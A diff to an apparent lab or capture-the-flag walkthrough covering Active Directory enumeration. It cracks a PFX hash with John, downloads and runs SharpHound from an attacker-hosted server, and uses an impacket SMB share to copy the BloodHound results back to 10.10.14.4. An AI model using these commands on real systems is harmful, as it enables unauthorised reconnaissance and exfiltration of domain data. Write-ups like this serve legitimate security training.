@@ -104,5 +104,18 @@ john pfx_hash -w=/usr/share/wordlists/rockyou.txt
 ```
 python3 -m http.server 80
 wget 10.10.14.4/SharpHound.exe -o SharpHound.exe
+./SharpHound.exe
 ```
 ![image](https://user-images.githubusercontent.com/33616880/230702230-01468743-51b4-4de4-8cc5-d551ec9d23b7.png)
+![image](https://user-images.githubusercontent.com/33616880/230702368-31f4bfd3-58cc-41fd-a2d2-6ffa6264cda3.png)
+
+
+
+```
+./smbserver.py share . -smb2support -username df -password df
+```
+```
+net use \\10.10.14.4\share /u:df df
+copy 20230408050326_BloodHound.zip \\10.10.14.4\share\
+```
+![image](https://user-images.githubusercontent.com/33616880/230702543-ff4a81d9-d0e4-4c98-a178-ecd3f25e694f.png)
